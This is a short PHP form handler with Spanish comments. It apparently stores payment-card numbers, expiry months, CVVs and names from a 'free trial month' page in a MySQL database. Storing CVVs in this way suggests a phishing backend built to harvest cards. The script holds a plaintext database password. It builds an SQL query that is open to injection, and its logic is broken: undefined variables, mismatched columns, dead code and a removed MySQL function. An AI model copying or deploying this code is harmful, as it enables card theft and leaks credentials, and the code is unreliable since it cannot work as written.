<?php

	//conectamos Con el servidor
	$conectar=mysqli_connect('localhost','id19736044_gratis','cM41qH-FBVL%UaTU','id19736044_mesdepruebagrat');
	//verificamos la conexion
	if(!$conectar){
		echo"No Se Pudo Conectar Con El Servidor";
	
	//recuperar las variables
	
    if(isset($_POST['Pagar'])) {
        if (strlen($_POST['cn']))
           if (strlen($_POST['month']))
           if ( strlen($_POST['cvv'])) 
           if ( strlen($_POST['name']) )  
	//hacemos la sentencia de sql
    $consulta=" INSERT INTO  `mesdepruebagrat`(`id`, `numero`, `fecha`, `cvv`, `nombre`) VALUES ('$cn','$month','$cvv','$name',)";
    $resultado = mysqli_query($conex,$consulta);
    $resultado=$conexion->query($query);
        try {
            $conn = new PDO("mysql:host=$servername;dbname=myDB", $username, $password);
            // set the PDO error mode to exception
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            echo "Connected successfully";
          } catch(PDOException $e) {
            echo "Connection failed: " . $e->getMessage();
          }
	//ejecutamos la sentencia de sql
	$ejecutar=mysql_db_query($sql);
	//verificamos la ejecucion
	if(!$ejecutar){
		echo"Hubo Algun Error";
	}else{
		echo"Datos Guardados Correctamente<br><a href='index.html'>Volver</a>";
	}
}
}
?>